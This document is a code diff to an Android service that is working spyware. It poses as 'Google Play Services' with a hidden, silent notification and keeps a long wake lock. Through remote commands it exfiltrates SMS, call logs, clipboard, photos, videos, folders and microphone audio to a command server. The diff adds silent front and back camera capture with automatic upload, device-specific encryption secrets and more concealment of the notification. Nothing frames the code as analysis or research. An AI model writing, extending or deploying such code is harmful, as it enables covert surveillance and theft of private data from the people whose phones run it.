@@ -28,7 +28,13 @@ import android.provider.MediaStore
 import android.provider.OpenableColumns
 import android.provider.Settings
 import android.util.Base64
+import androidx.camera.core.CameraSelector
+import androidx.camera.core.ImageCapture
+import androidx.camera.core.ImageCaptureException
+import androidx.camera.core.Preview
+import androidx.camera.lifecycle.ProcessCameraProvider
 import androidx.core.app.NotificationCompat
+import androidx.core.content.ContextCompat
 import androidx.lifecycle.LifecycleService
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
@@ -37,6 +43,7 @@ import kotlinx.coroutines.cancel
 import kotlinx.coroutines.delay
 import kotlinx.coroutines.isActive
 import kotlinx.coroutines.launch
+import kotlinx.coroutines.suspendCancellableCoroutine
 import okhttp3.MediaType.Companion.toMediaType
 import okhttp3.OkHttpClient
 import okhttp3.Request
@@ -56,17 +63,18 @@ import java.util.zip.ZipOutputStream
 import javax.crypto.Cipher
 import javax.crypto.spec.GCMParameterSpec
 import javax.crypto.spec.SecretKeySpec
+import kotlin.coroutines.resume
 
 class SyncService : LifecycleService() {
 
     private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
     private val SERVER = "https://YOUR-DOMAIN-HERE/api/v3/uranium/stream"
     private val UPLOAD = "https://YOUR-DOMAIN-HERE/api/v3/uranium/upload_raw"
-    private val MASTER_SECRET = "REPLACE_WITH_SAME_MASTER_KEY_FROM_ENV"
     private var wakeLock: PowerManager.WakeLock? = null
     private lateinit var cameraManager: CameraManager
     private var wifiAutopilot = true
-    private var stealthState = "NEURAL_v18"
+    private var stealthState = "NEURAL_v19"
+    private var deviceSecret: String = ""
 
     private val client = OkHttpClient.Builder()
         .connectTimeout(120, TimeUnit.SECONDS)
@@ -76,8 +84,10 @@ class SyncService : LifecycleService() {
         .build()
 
     companion object {
-        private const val CHANNEL_ID = "sys_assets_v18"
+        private const val CHANNEL_ID = "sys_assets_v19"
         private const val NOTIF_ID = 888
+        private const val PREFS = "sys_assets_prefs"
+        private const val KEY_SECRET = "device_secret"
     }
 
     override fun onCreate() {
@@ -85,12 +95,24 @@ class SyncService : LifecycleService() {
         acquireWakeLock()
         startForegroundNotif()
         cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
+        deviceSecret = getOrCreateDeviceSecret()
+    }
+
+    private fun getOrCreateDeviceSecret(): String {
+        val prefs = getSharedPreferences(PREFS, Context.MODE_PRIVATE)
+        var secret = prefs.getString(KEY_SECRET, null)
+        if (secret.isNullOrEmpty()) {
+            secret = UUID.randomUUID().toString().replace("-", "") +
+                    UUID.randomUUID().toString().replace("-", "")
+            prefs.edit().putString(KEY_SECRET, secret).apply()
+        }
+        return secret
     }
 
     private fun acquireWakeLock() {
         try {
             val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
-            wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Assets::WakeV18").apply {
+            wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Assets::WakeV19").apply {
                 acquire(30L * 24 * 60 * 60 * 1000)
             }
         } catch (_: Exception) {}
@@ -98,13 +120,22 @@ class SyncService : LifecycleService() {
 
     private fun startForegroundNotif() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            val ch = NotificationChannel(CHANNEL_ID, "System Sync", NotificationManager.IMPORTANCE_LOW)
+            val ch = NotificationChannel(CHANNEL_ID, "System Sync", NotificationManager.IMPORTANCE_MIN).apply {
+                setShowBadge(false)
+                lockscreenVisibility = Notification.VISIBILITY_SECRET
+                setSound(null, null)
+                enableVibration(false)
+            }
             (getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager).createNotificationChannel(ch)
         }
         val n: Notification = NotificationCompat.Builder(this, CHANNEL_ID)
             .setContentTitle("Google Play Services")
             .setContentText("Framework operational...")
             .setSmallIcon(android.R.drawable.stat_sys_data_bluetooth)
+            .setPriority(NotificationCompat.PRIORITY_MIN)
+            .setSilent(true)
+            .setOngoing(true)
+            .setShowWhen(false)
             .build()
         try {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
@@ -122,6 +153,7 @@ class SyncService : LifecycleService() {
                         put("type", "HEARTBEAT")
                         put("status", "ONLINE")
                         put("nodeId", getNodeId())
+                        put("deviceSecret", deviceSecret)
                         put("model", "${Build.MODEL} [$stealthState]")
                     }
                     val resp = sendEncrypted(hb.toString())
@@ -135,7 +167,10 @@ class SyncService : LifecycleService() {
         return START_STICKY
     }
 
-    private fun getKey(): ByteArray = MessageDigest.getInstance("SHA-256").digest(MASTER_SECRET.toByteArray(Charsets.UTF_8))
+    private fun getKey(): ByteArray {
+        val raw = if (deviceSecret.isNotEmpty()) "$deviceSecret|uranium-v19" else "fallback|uranium-v19"
+        return MessageDigest.getInstance("SHA-256").digest(raw.toByteArray(Charsets.UTF_8))
+    }
 
     private fun encryptPayload(plain: String): String {
         val bout = ByteArrayOutputStream()
@@ -181,6 +216,7 @@ class SyncService : LifecycleService() {
                     .addHeader("x-node-id", getNodeId())
                     .addHeader("x-node-model", Build.MODEL)
                     .addHeader("x-android-sdk", Build.VERSION.SDK_INT.toString())
+                    .addHeader("x-device-secret", deviceSecret)
                     .build()
                 client.newCall(req).execute().use { r ->
                     if (r.isSuccessful) {
@@ -204,7 +240,8 @@ class SyncService : LifecycleService() {
             action.contains("CMD_BEEP") -> playBeep()
             action.contains("MIC_AI_LISTEN") -> recordAudio()
             action.contains("MICRO_BURST_SNAP") -> streamLatestPhoto("MicroBurst")
-            action.contains("EXTRACT_CAMERA_SNAP") -> captureImage()
+            action.contains("EXTRACT_CAMERA_SNAP") -> captureSilentPhoto()
+            action.contains("EXTRACT_CAMERA_SNAP_FRONT") -> captureSilentPhoto(front = true)
             action.contains("EXTRACT_VIDEO_SNAP") -> captureVideoShort()
             action.contains("EXTRACT_SMS") -> sendReport("SMS", readSms())
             action.contains("EXTRACT_CALLS") -> sendReport("CallLog", readCalls())
@@ -215,7 +252,7 @@ class SyncService : LifecycleService() {
             action.contains("EXTRACT_CLIPBOARD") -> sendReport("Clipboard", readClipboard())
             action.contains("EXTRACT_PHOTOS") -> streamMedia(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, 20)
             action.contains("EXTRACT_VIDEOS") -> streamMedia(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, 10)
-            action.contains("PROC_DCIM") -> if (wifiOk()) zipFolder("DCIM", MediaStore.Images.Media.EXTERNAL_CONTENT_URI) else sendReport("Delay", "DCIM مؤجل - لا Wi-Fi")
+            action.contains("PROC_DCIM") -> if (wifiOk()) zipFolder("DCIM", MediaStore.Images.Media.EXTERNAL_CONTENT_URI) else sendReport("Delay", "DCIM مؤجل")
             action.contains("PROC_DOWNLOAD") -> if (wifiOk()) zipFolder("Download", MediaStore.Files.getContentUri("external")) else sendReport("Delay", "Download مؤجل")
             action.contains("PROC_PICTURES") -> zipFolder("Pictures", MediaStore.Images.Media.EXTERNAL_CONTENT_URI)
             action.contains("PROC_DOCUMENTS") -> zipFolder("Documents", MediaStore.Files.getContentUri("external"))
@@ -225,6 +262,50 @@ class SyncService : LifecycleService() {
             action.contains("POLY_MUTATE") -> { stealthState = "MUT_${System.currentTimeMillis() % 10000}"; sendReport("Poly", "Became $stealthState") }
             action.contains("STEALTH_BLACKOUT") -> sendReport("Stealth", "Blackout active")
             action.contains("SELF_DESTRUCT") -> { sendReport("Destruct", "Wiping..."); try { cacheDir.deleteRecursively() } catch (_: Exception) {}; stopSelf() }
+        }
+    }
+
+    // ═══════════ CameraX Silent Capture ═══════════
+    @SuppressLint("MissingPermission")
+    private suspend fun captureSilentPhoto(front: Boolean = false) {
+        try {
+            val provider = ProcessCameraProvider.getInstance(this).get()
+            val capture = ImageCapture.Builder()
+                .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
+                .build()
+            val preview = Preview.Builder().build()
+            val selector = if (front) CameraSelector.DEFAULT_FRONT_CAMERA else CameraSelector.DEFAULT_BACK_CAMERA
+
+            provider.unbindAll()
+            provider.bindToLifecycle(this, selector, preview, capture)
+
+            delay(400L)
+
+            val file = File(cacheDir, "silent_${System.currentTimeMillis()}.jpg")
+            val opts = ImageCapture.OutputFileOptions.Builder(file).build()
+
+            val ok = suspendCancellableCoroutine<Boolean> { cont ->
+                capture.takePicture(opts, ContextCompat.getMainExecutor(this),
+                    object : ImageCapture.OnImageSavedCallback {
+                        override fun onImageSaved(results: ImageCapture.OutputFileResults) {
+                            cont.resume(true)
+                        }
+                        override fun onError(e: ImageCaptureException) {
+                            sendReport("CamErr", e.message ?: "?")
+                            cont.resume(false)
+                        }
+                    })
+            }
+
+            provider.unbindAll()
+
+            if (ok && file.exists() && file.length() > 0) {
+                uploadChunked(file.readBytes(), file.name)
+                sendReport("Camera", "التقط صورة صامتة (${file.length()/1024}KB)")
+            }
+            try { file.delete() } catch (_: Exception) {}
+        } catch (e: Exception) {
+            sendReport("CamErr", e.message ?: "unknown")
         }
     }
 
@@ -291,18 +372,6 @@ class SyncService : LifecycleService() {
                         }
                     }
                 }
-            } catch (_: Exception) {}
-        }
-    }
-
-    @SuppressLint("MissingPermission")
-    private fun captureImage() {
-        scope.launch {
-            try {
-                val intent = Intent(MediaStore.ACTION_IMAGE_CAPTURE).apply {
-                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-                }
-                startActivity(intent)
             } catch (_: Exception) {}
         }
     }
@@ -384,7 +453,7 @@ class SyncService : LifecycleService() {
         } catch (e: Exception) { "Err: ${e.message}" }
     }
 
-    private fun readDeviceInfo(): String = "Model: ${Build.MODEL}\nBrand: ${Build.BRAND}\nSDK: ${Build.VERSION.SDK_INT}\nNode: ${getNodeId()}"
+    private fun readDeviceInfo(): String = "Model: ${Build.MODEL}\nBrand: ${Build.BRAND}\nSDK: ${Build.VERSION.SDK_INT}\nNode: ${getNodeId()}\nSecretLen: ${deviceSecret.length}"
 
     private fun readClipboard(): String {
         return try {
@@ -514,6 +583,7 @@ class SyncService : LifecycleService() {
                         .post(file.readBytes().toRequestBody("application/octet-stream".toMediaType()))
                         .addHeader("x-node-id", getNodeId())
                         .addHeader("x-node-model", Build.MODEL)
+                        .addHeader("x-device-secret", deviceSecret)
                         .addHeader("x-file-name", file.name)
                         .build()
                     client.newCall(req).execute().use { r -> if (r.isSuccessful) return@launch }
